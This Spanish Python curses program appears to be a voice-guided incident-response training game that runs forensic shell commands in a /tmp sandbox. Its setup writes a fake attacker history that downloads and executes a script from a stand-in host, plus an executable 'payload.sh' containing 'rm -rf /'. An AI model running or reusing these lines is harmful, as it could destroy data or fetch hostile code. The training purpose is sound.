import curses
import time
import os
import subprocess
import shutil
import hashlib
import textwrap
import random

# --- MOTOR DE VOZ IA (EDGE-TTS - LOQUENDO) BLINDADO ---
def hablar(texto, rate=280, esperar=False, matar_previo=False):
    try:
        if matar_previo:
            os.system("pkill -9 mpg123 >/dev/null 2>&1")
            os.system("pkill -f edge-tts >/dev/null 2>&1")

        texto_limpio = texto.replace('"', '').replace("'", "")
        
        if rate == 200: velocidad = "+15%"  
        elif rate == 240: velocidad = "+25%"  
        elif rate >= 280: velocidad = "+40%"  
        else: velocidad = "+15%"

        comando_bash = f'(edge-tts --voice es-MX-JorgeNeural --rate="{velocidad}" --text "{texto_limpio}" | mpg123 -q -) 2>/dev/null'
        
        if not esperar:
            comando_bash += ' &' 
            
        os.system(comando_bash)
    except:
        pass

def deletrear(cmd):
    res = []
    for char in cmd:
        if char == ' ': res.append('espacio')
        elif char == '-': res.append('guion')
        elif char == '/': res.append('barra')
        elif char == '.': res.append('punto')
        elif char == '*': res.append('asterisco')
        elif char == '_': res.append('guion bajo')
        elif char == '>': res.append('mayor que')
        elif char == '<': res.append('menor que')
        elif char == '|': res.append('tuberia')
        elif char == '\\': res.append('barra invertida')
        elif char == '"': res.append('comillas dobles')
        elif char.isalpha():
            if char.isupper(): res.append(f'letra {char.lower()} mayúscula')
            else: res.append(f'letra {char.lower()}')
        elif char.isdigit():
            res.append(f'número {char}')
        else: res.append(char)
    return " . ".join(res)

def draw_text_wrapped(stdscr, y, x, text, width, color):
    y_actual = y
    for parrafo in text.split('\n'):
        lineas = textwrap.wrap(parrafo, width)
        for linea in lineas:
            try:
                stdscr.addstr(y_actual, x, linea, color)
            except curses.error: pass
            y_actual += 1
    return y_actual

def format_time(segundos):
    mins = int(segundos // 60)
    secs = int(segundos % 60)
    return f"{mins:02d}:{secs:02d}"

# --- GENERADOR DEL ENTORNO SEGURO (SANDBOX) ---
def preparar_sandbox():
    ruta_sandbox = "/tmp/academia_sandbox"
    if os.path.exists(ruta_sandbox):
        shutil.rmtree(ruta_sandbox)
    os.makedirs(ruta_sandbox)
    os.system(f"echo 'wget http://servidor-ruso.com/payload.sh\nchmod +x payload.sh\n./payload.sh' > {ruta_sandbox}/.bash_history")
    os.system(f"echo '#!/bin/bash\necho \"Iniciando ransomware...\"\nrm -rf /' > {ruta_sandbox}/payload.sh")
    os.system(f"chmod +x {ruta_sandbox}/payload.sh")
    os.system(f"echo 'Acceso no autorizado detectado en el puerto 22.' > {ruta_sandbox}/syslog_error.log")
    return ruta_sandbox

# --- ANIMACIONES CINEMÁTICAS E INTERACTIVAS ---
def animacion_arranque_sandbox(stdscr):
    curses.curs_set(0)
    alto, ancho = stdscr.getmaxyx()
    stdscr.clear()
    
    hablar("Iniciando entorno virtual seguro. Desplegando escenario forense.", rate=200, esperar=False, matar_previo=True)
    
    # Simulación de arranque de consola
    lineas_arranque = [
        "[*] Montando sistema de archivos virtual en RAM (tmpfs)... OK",
        "[*] Aislando kernel y procesos (namespaces)... OK",
        "[*] Generando logs falsos e historial del atacante... OK",
        "[*] Inyectando script malicioso [payload.sh]... OK",
        "[*] Aplicando permisos de ejecución... OK",
        "[!] RANSOMWARE DETECTADO EN EL ENTORNO. CONTENCIÓN REQUERIDA."
    ]
    
    y = alto // 2 - 4
    for linea in lineas_arranque:
        color = curses.color_pair(11) if "RANSOMWARE" in linea else curses.color_pair(3)
        stdscr.addstr(y, ancho // 2 - len(linea)//2, linea, color | curses.A_BOLD)
        stdscr.refresh()
        time.sleep(0.6)
        y += 1
        
    time.sleep(1)
    hablar("Contenedor listo. Presiona enter para iniciar la investigación táctica.", rate=200, esperar=True)
    
    stdscr.addstr(y + 2, ancho // 2 - 20, "[ PRESIONA ENTER PARA ABRIR LA TERMINAL ]", curses.color_pair(10) | curses.A_BLINK)
    stdscr.refresh()
    curses.flushinp()
    while stdscr.getch() not in [10, 13]: pass

def animacion_fallo_ransomware(stdscr):
    curses.curs_set(0)
    alto, ancho = stdscr.getmaxyx()
    hablar("Fallo de contención. El ransomware se ha ejecutado. Perdimos el servidor.", rate=200, esperar=False, matar_previo=True)
    
    for _ in range(8):
        stdscr.bkgd(' ', curses.color_pair(11))
        stdscr.clear()
        stdscr.addstr(alto//2 - 1, ancho//2 - 15, " ☠️  SISTEMA ENCRIPTADO ☠️ ", curses.color_pair(5) | curses.A_BOLD)
        stdscr.addstr(alto//2 + 1, ancho//2 - 20, " TODA LA INFORMACIÓN HA SIDO COMPROMETIDA ", curses.color_pair(5) | curses.A_BOLD)
        stdscr.refresh()
        time.sleep(0.3)
        stdscr.bkgd(' ', curses.color_pair(2))
        stdscr.clear()
        stdscr.refresh()
        time.sleep(0.3)
    
    stdscr.bkgd(' ', curses.color_pair(5))
    time.sleep(1)

def animacion_victoria_purga(stdscr):
    curses.curs_set(0)
    alto, ancho = stdscr.getmaxyx()
    stdscr.clear()
    
    hablar("Investigación exitosa. Iniciando purga del entorno virtual para eliminar rastros.", rate=200, esperar=False, matar_previo=True)
    
    stdscr.addstr(alto//2 - 2, ancho//2 - 15, "=== PURGANDO SANDBOX ===", curses.color_pair(10) | curses.A_BOLD)
    
    # Barra de progreso destructiva
    for i in range(101):
        barra = "▓" * (i // 4) + "░" * (25 - (i // 4))
        stdscr.addstr(alto//2, ancho//2 - 18, f"Destruyendo: [{barra}] {i}%", curses.color_pair(11))
        if i % 10 == 0:
            stdscr.addstr(alto//2 + 2, ancho//2 - 12, f"Borrando inodos... {random.randint(1000, 9999)}", curses.color_pair(2))
        stdscr.refresh()
        time.sleep(0.04)
        
    stdscr.clear()
    stdscr.addstr(alto//2, ancho//2 - 12, "✅ ENTORNO DESINFECTADO", curses.color_pair(3) | curses.A_BOLD)
    stdscr.refresh()
    hablar("Entorno purgado con éxito. Servidor asegurado.", rate=200, esperar=True)
    time.sleep(1)

# --- BASE DE DATOS TÁCTICA: INCIDENT RESPONSE ---
misiones_sandbox = [
    {"cmd": "pwd", "desc": "Imprime el directorio de trabajo actual para confirmar tu ubicacion en el Sandbox."},
    {"cmd": "ls", "desc": "Lista los archivos visibles en el directorio actual."},
    {"cmd": "ls -la", "desc": "Lista TODOS los archivos, incluyendo los ocultos, con detalles de permisos."},
    {"cmd": "cat .bash_history", "desc": "Lee el historial de comandos oculto para ver que hizo el atacante."},
    {"cmd": "grep \"wget\" .bash_history", "desc": "Filtra el historial buscando de donde se descargo el virus."},
    {"cmd": "cat payload.sh", "desc": "Inspecciona el codigo fuente del malware encontrado."},
    {"cmd": "chmod -x payload.sh", "desc": "Quita los permisos de ejecucion del malware para neutralizarlo."},
    {"cmd": "mkdir cuarentena", "desc": "Crea una carpeta segura para aislar la amenaza."},
    {"cmd": "mv payload.sh cuarentena/", "desc": "Mueve el script malicioso a la carpeta de cuarentena."},
    {"cmd": "cp .bash_history cuarentena/evidencia.txt", "desc": "Copia el historial como evidencia para la auditoria."},
    {"cmd": "rm -rf cuarentena/", "desc": "Elimina permanentemente la cuarentena y todo el malware en ella."},
    {"cmd": "echo \"INCIDENTE RESUELTO\" > reporte.log", "desc": "Crea un log oficial confirmando la desinfeccion."},
    {"cmd": "tar -czvf reporte.tar.gz reporte.log", "desc": "Comprime el reporte para enviarlo al Equipo Azul."},
    {"cmd": "df -h .", "desc": "Verifica el espacio en disco restante de la particion actual."},
    {"cmd": "uname -a", "desc": "Muestra la informacion del kernel de Debian/Kali para el reporte final."}
]

# --- MOTOR DE EJECUCIÓN REAL (SANDBOX FORENSE) ---
# --- MOTOR DE EJECUCIÓN REAL (SANDBOX FORENSE) CORREGIDO ---
def ejecutar_sandbox_real(stdscr, comandos=misiones_sandbox):
    # Colores iniciales
    curses.init_pair(10, curses.COLOR_GREEN, curses.COLOR_BLACK)
    curses.init_pair(11, curses.COLOR_RED, curses.COLOR_BLACK)
    curses.init_pair(12, curses.COLOR_YELLOW, curses.COLOR_BLACK)
    curses.init_pair(2, curses.COLOR_WHITE, curses.COLOR_BLACK)
    curses.init_pair(3, curses.COLOR_GREEN, curses.COLOR_BLACK)
    curses.init_pair(4, curses.COLOR_CYAN, curses.COLOR_BLACK)
    curses.init_pair(5, curses.COLOR_BLACK, curses.COLOR_WHITE)

    animacion_arranque_sandbox(stdscr)
    ruta_sandbox = preparar_sandbox()
    
    start_time_nivel = time.time()
    tiempo_hablando = 0
    errores_restantes = 10
    
    alto, ancho = stdscr.getmaxyx()
    mx = int(ancho * 0.1)

    try:
        for idx, m in enumerate(comandos):
            input_user = ""
            exito = False
            voz_lista = False
            salida_real = "" 
            
            while not exito:
                stdscr.clear()
                
                # DERROTA
                if errores_restantes <= 0:
                    animacion_fallo_ransomware(stdscr)
                    return False, 0, 10
                    
                tiempo_transcurrido = time.time() - start_time_nivel - tiempo_hablando
                if tiempo_transcurrido < 0: tiempo_transcurrido = 0
                    
                color_reloj = curses.color_pair(11) | curses.A_BLINK if errores_restantes <= 3 else curses.color_pair(10)
                stdscr.addstr(2, mx, f"FASE FORENSE: {idx+1}/{len(comandos)} | RESPUESTA A INCIDENTES", curses.color_pair(12) | curses.A_BOLD)
                stdscr.addstr(2, ancho - mx - 40, f"INTEGRIDAD: {errores_restantes}/10 | TIEMPO: {format_time(tiempo_transcurrido)}", color_reloj)
                
                stdscr.addstr(4, mx, "OBJETIVO TÁCTICO:", curses.A_BOLD)
                stdscr.addstr(5, mx, m['desc'], curses.color_pair(2))
                
                stdscr.addstr(7, mx, "COMANDO REQUERIDO:", curses.color_pair(4))
                stdscr.addstr(8, mx, m['cmd'], curses.color_pair(4) | curses.A_BOLD)

                # DIBUJO DE LA TERMINAL REAL Y SUS RESPUESTAS
                stdscr.addstr(10, mx, "┌── TERMINAL DE KALI LINUX (SANDBOX) ──────────────────────────", curses.color_pair(5))
                if salida_real:
                    # Imprimimos lo que Kali respondió de verdad en un recuadro
                    lineas_salida = salida_real.strip().split('\n')
                    y_out = 11
                    for linea_out in lineas_salida[:8]: # Limitamos a 8 líneas para no desbordar
                        try:
                            stdscr.addstr(y_out, mx, f"│ {linea_out[:ancho-mx*2-4]}", curses.color_pair(2))
                            y_out += 1
                        except curses.error: pass
                    stdscr.addstr(y_out, mx, "└──────────────────────────────────────────────────────────────", curses.color_pair(5))

                stdscr.addstr(alto-4, mx, "root@sandbox:~# ", curses.A_BOLD)
                
                # BUGFIX 1: Dibujamos lo que el usuario está escribiendo para que no sea invisible
                if input_user:
                    stdscr.addstr(alto-4, mx + 16, input_user, curses.color_pair(3) | curses.A_BOLD)

                stdscr.addstr(alto-2, mx, "[ F1: REPETIR DELETREO DE COMANDO ]", curses.color_pair(10) | curses.A_BOLD)

                # -- Control de Voz --
                if not voz_lista:
                    curses.curs_set(0)
                    stdscr.addstr(alto-4, mx + 16, "[ ESCUCHANDO INSTRUCCIONES... ]", curses.color_pair(12) | curses.A_BLINK)
                    stdscr.refresh()
                    
                    t_inicio_voz = time.time()
                    hablar(f"Objetivo: {m['desc']}. Comando: {m['cmd']}.", rate=200, esperar=True, matar_previo=True)
                    tiempo_hablando += (time.time() - t_inicio_voz)
                    
                    curses.flushinp() 
                    voz_lista = True
                    stdscr.move(alto-4, mx)
                    stdscr.clrtoeol()
                    stdscr.addstr(alto-4, mx, "root@sandbox:~# ", curses.A_BOLD)

                curses.curs_set(1)
                stdscr.move(alto-4, mx + 16 + len(input_user))
                stdscr.refresh()

                stdscr.timeout(100)
                k = stdscr.getch()

                if k in [10, 13]: 
                    if input_user.strip() == m['cmd']:
                        curses.curs_set(0)
                        
                        # --- EJECUCIÓN REAL EN KALI LINUX ---
                        try:
                            resultado = subprocess.run(m['cmd'], shell=True, text=True, capture_output=True, timeout=2, cwd=ruta_sandbox)
                            if resultado.stdout:
                                salida_real = resultado.stdout
                            elif resultado.stderr:
                                salida_real = f"[ERROR DEL SISTEMA]\n{resultado.stderr}"
                            else:
                                salida_real = "[Ejecutado sin salida en consola]"
                        except Exception as e:
                            salida_real = f"Error fatal: {str(e)}"
                        
                        # BUGFIX 2: REDIBUJAR LA PANTALLA CON LA SALIDA REAL Y PAUSAR
                        stdscr.clear()
                        stdscr.addstr(2, mx, f"FASE FORENSE: {idx+1}/{len(comandos)} | RESPUESTA A INCIDENTES", curses.color_pair(12) | curses.A_BOLD)
                        stdscr.addstr(4, mx, "OBJETIVO TÁCTICO:", curses.A_BOLD)
                        stdscr.addstr(5, mx, m['desc'], curses.color_pair(2))
                        stdscr.addstr(7, mx, "COMANDO EJECUTADO:", curses.color_pair(4))
                        stdscr.addstr(8, mx, m['cmd'], curses.color_pair(3) | curses.A_BOLD)
                        
                        stdscr.addstr(10, mx, "┌── RESULTADO DE TERMINAL (KALI LINUX) ────────────────────────", curses.color_pair(5))
                        lineas_salida = salida_real.strip().split('\n')
                        y_out = 11
                        for linea_out in lineas_salida[:8]: 
                            try:
                                stdscr.addstr(y_out, mx, f"│ {linea_out[:ancho-mx*2-4]}", curses.color_pair(2))
                                y_out += 1
                            except curses.error: pass
                        stdscr.addstr(y_out, mx, "└──────────────────────────────────────────────────────────────", curses.color_pair(5))
                        
                        stdscr.addstr(alto-4, mx, f"root@sandbox:~# {m['cmd']}", curses.color_pair(3))
                        stdscr.addstr(alto-2, mx, "[ LEYENDO RESULTADOS... ESPERA ]", curses.color_pair(12) | curses.A_BLINK)
                        stdscr.refresh()
                        
                        t_inicio_voz = time.time()
                        hablar("Comando procesado.", rate=240, esperar=True, matar_previo=True) 
                        tiempo_hablando += (time.time() - t_inicio_voz)
                        
                        time.sleep(3.5) # Pausa dramática para que el alumno asimile la terminal
                        
                        exito = True # Ahora sí pasamos al siguiente
                    else: 
                        input_user = ""
                        
                elif k in [127, 8, curses.KEY_BACKSPACE]:
                    input_user = input_user[:-1]
                elif k == curses.KEY_F1:
                    hablar(f"Deletreo: {deletrear(m['cmd'])}", rate=200, esperar=False, matar_previo=True)
                elif 32 <= k <= 126:
                    char = chr(k)
                    pos_actual = len(input_user)
                    
                    if pos_actual < len(m['cmd']) and char == m['cmd'][pos_actual]:
                        input_user += char
                    else:
                        input_user = "" 
                        errores_restantes -= 1
                        hablar(f"Error. Vidas restantes: {errores_restantes}", rate=280, esperar=False, matar_previo=True) 
                elif k == 27: 
                    return False, 0, 0
                
        # VICTORIA
        animacion_victoria_purga(stdscr)
        curses.curs_set(0)
        tiempo_final = time.time() - start_time_nivel - tiempo_hablando
        return True, tiempo_final, 10 - errores_restantes

    finally:
        # Destruye el Sandbox pase lo que pase
        if os.path.exists(ruta_sandbox):
            shutil.rmtree(ruta_sandbox)

# Wrapper para correrlo directamente y probarlo
def iniciar(stdscr):
    ejecutar_sandbox_real(stdscr)

if __name__ == "__main__":
    curses.wrapper(iniciar)